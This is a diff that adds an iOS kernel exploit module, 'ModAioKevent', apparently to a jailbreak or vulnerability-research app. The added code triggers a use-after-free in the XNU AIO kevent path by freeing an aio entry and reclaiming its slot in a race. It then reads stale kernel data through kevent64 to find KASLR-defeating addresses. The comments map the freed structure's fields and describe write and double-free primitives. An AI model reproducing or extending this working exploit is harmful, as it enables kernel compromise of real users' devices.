@@ -1427,6 +1427,168 @@ NSString *ModSetreuidRace(void) {
               g_calls, g_errs, g_changed, geteuid());
 }
 
+// CVE-free AIO kevent UAF - device-proven on iOS 26.2 / 23C55 (xnu-12377.62.10),
+// i.e. the SAME kernel family as our 23C5027f (xnu-12377.60.50).
+// Source: AIOsource/lightsword-iphone-16, Sources/Legacy/aio_kevent_rw.c
+//
+// Mechanism (their device log Documents/aio_uaf.log):
+//   main:  lio_listio -> enqueue aio_workq_entry E1
+//   main:  SIGEV_KEVENT in the aiocb -> knote, kn_hook = raw dangling ptr
+//   racer: aio_return(E1)                       [FREE]
+//   racer: aio_read(rcb[i]) on the same thread  [RECLAIM the same slot, LIFO]
+//   kernel: do_aio_completion_and_unlock -> KNOTE(hint=1)
+//           -> filt_aioevent: E1->flags & AIO_COMPLETED
+//   main:  kevent64 -> filt_aioprocess on the DANGLING entry:
+//            ext[0] = entry+0x28, ext[1] = entry+0x20, data = 0,
+//            TAILQ_REMOVE(+0x10/+0x18), aio_entry_unref(+0x2C),
+//            aio_proc_lock(*(+0x40))
+//   HIT: the kevent is delivered on the reclaimed entry (ext[1] == marker)
+//
+// Two rules they found the hard way:
+//   * the reclaim request MUST be SIGEV_NONE (a second SIGEV_KEVENT knote
+//     makes filt_aioprocess walk the entry twice -> procp == 0 -> FAR=0x58)
+//   * reap with aio_return, never aio_cancel (cancel frees the entry while it
+//     can still be queued on the KNOTE)
+//   * free and reclaim in the SAME thread -> same CPU -> same zone magazine,
+//     so the first allocation after the free takes exactly the freed slot.
+//
+// aio_workq_entry map (zone aio_workq_zonep ~224 B, zeroed on free):
+//   +0x10 aio_proc_link (next/prev)  WRITE: *prev = next (TAILQ_REMOVE)
+//   +0x20 returnval  i64             READ: kev.ext[1]
+//   +0x28 errorval   i32             READ: kev.ext[0]
+//   +0x2C refcount   u32             aio_entry_unref -> double-free
+//   +0x40 procp      struct proc*    aio_proc_lock(*(v)); 0 -> PANIC FAR=0x58
+//   +0x48 uaiocbp    user ptr        -> kev.ident
+//   +0x50 aiocb      user ptr        -> kev.udata
+NSString *ModAioKevent(void) {
+    AveLog(@"[aio20637b12] === AIO kevent UAF: B1 trigger + B2 kevent read ===");
+
+    const size_t FILE_SZ = 0x10000;
+    const ssize_t VICTIM_NB = FILE_SZ;
+    const ssize_t RECL_NB = 0x0200;
+    const int NRECLAIM = 8;
+    const uint64_t RECL_MARKER = 0x4141;
+
+    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
+                                                         NSUserDomainMask, YES) firstObject];
+    NSString *path = [dir stringByAppendingPathComponent:@"aio_uaf.bin"];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    if (![fm fileExistsAtPath:path]) {
+        NSMutableData *d = [NSMutableData dataWithLength:FILE_SZ];
+        [d writeToFile:path atomically:YES];
+    }
+    int fd = open([path fileSystemRepresentation], O_RDWR);
+    if (fd < 0) return @"cannot open the aio file";
+
+    int kq = kqueue();
+    if (kq < 0) { close(fd); return @"kqueue failed"; }
+
+    static char vbuf[0x10000];
+    static char rbuf[8][0x10000];
+
+    int hits = 0, silent = 0, attempts = 0, panics_guess = 0;
+    uint64_t best_kva = 0;
+    char best_field[24] = {0};
+
+    const int ROUNDS = 40;
+    for (int round = 0; round < ROUNDS; round++) {
+        struct aiocb cb;
+        struct aiocb rcb[8];
+        memset(&cb, 0, sizeof cb);
+        memset(rcb, 0, sizeof rcb);
+
+        cb.aio_fildes = fd;
+        cb.aio_offset = 0;
+        cb.aio_buf = vbuf;
+        cb.aio_nbytes = VICTIM_NB;
+        cb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+        cb.aio_sigevent.sigev_signo = kq;
+        cb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAAA1;
+
+        if (aio_read(&cb) != 0) { silent++; continue; }
+        attempts++;
+
+        // racer: free then reclaim, in this same thread (same CPU -> LIFO)
+        volatile int done = 0;
+        __block int issued = 0;
+        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+            for (int spin = 0; spin < 20000 && !done; spin++) {
+                if (aio_error(&cb) == 0) {
+                    ssize_t r = aio_return(&cb);
+                    if (r >= 0) {
+                        for (int i = 0; i < NRECLAIM; i++) {
+                            memset(&rcb[i], 0, sizeof(struct aiocb));
+                            rcb[i].aio_fildes = fd;
+                            rcb[i].aio_offset = 0;
+                            rcb[i].aio_buf = rbuf[i];
+                            rcb[i].aio_nbytes = RECL_NB;
+                            rcb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+                            if (aio_read(&rcb[i]) == 0) issued++;
+                        }
+                        done = 1;
+                        return;
+                    }
+                }
+                usleep(20);
+            }
+        });
+        // wait for the racer to finish the free+reclaim
+        for (int spin = 0; spin < 100000 && !done; spin++) usleep(50);
+        usleep(2000);
+
+        // B2: read the kevent that filt_aioprocess fills from the stale entry
+        struct kevent64_s kev[8];
+        memset(kev, 0, sizeof kev);
+        struct timespec to;
+        to.tv_sec = 0;
+        to.tv_nsec = 20000000;   // 20 ms
+        int n = kevent64(kq, NULL, 0, kev, 8, 0, &to);
+        if (n > 0) {
+            for (int i = 0; i < n; i++) {
+                uint64_t e0 = (uint64_t)kev[i].ext[0];
+                uint64_t e1 = (uint64_t)kev[i].ext[1];
+                uint64_t id = (uint64_t)kev[i].ident;
+                uint64_t ud = (uint64_t)kev[i].udata;
+                AveLog(S(@"[aio20637b12] round=%d ev=%d ext0=%#llx ext1=%#llx ident=%#llx udata=%#llx",
+                         round, i, e0, e1, id, ud));
+                if (e1 == RECL_MARKER || e1 == RECL_NB) {
+                    hits++;
+                    AveLog(S(@"[aio20637b12] *** HIT: kevent delivered on the RECLAIMED entry (ext1=%#llx) ***", e1));
+                }
+                // a kernel-looking value in any field is a KASLR anchor
+                struct { const char *n; uint64_t v; } flds[] = {
+                    {"ext0", e0}, {"ext1", e1}, {"ident", id}, {"udata", ud},
+                    {"data", (uint64_t)kev[i].data}, {"fflags", (uint64_t)kev[i].fflags},
+                };
+                for (int k = 0; k < 6; k++) {
+                    uint64_t a = flds[k].v & 0x00ffffffffffffffULL;
+                    if ((a >> 40) == 0xFFFFFULL && flds[k].v > best_kva) {
+                        best_kva = flds[k].v;
+                        snprintf(best_field, sizeof best_field, "%s", flds[k].n);
+                    }
+                }
+            }
+        } else {
+            silent++;
+        }
+
+        // reap with aio_return, never aio_cancel
+        for (int i = 0; i < NRECLAIM; i++) {
+            for (int s = 0; s < 50000 && aio_error(&rcb[i]) != 0; s++) {}
+            aio_return(&rcb[i]);
+        }
+    }
+
+    close(fd);
+    close(kq);
+    AveLog(S(@"[aio20637b12] rounds=%d attempts=%d hits=%d silent=%d best_kva=%#llx (%s)",
+             ROUNDS, attempts, hits, silent, best_kva, best_field[0] ? best_field : "none"));
+    AveSetStatus(@"aio kevent UAF done - see the log");
+    if (hits > 0)
+        return S(@"aio kevent UAF: %d/%d hits - the kevent IS delivered on the freed entry (kernel read)", hits, attempts);
+    return S(@"aio kevent UAF: %d attempts, %d hits (no hit - the reclaim did not land in the slot)", attempts, hits);
+}
+
 NSString *ModJpegMethods(void) {
     AveLog(@"[jpegmethods] === CVE-2026-20687 selector audit (hidgate-poc jpegmethods2 port) ===");
     io_service_t svc = rs_jpeg_service();
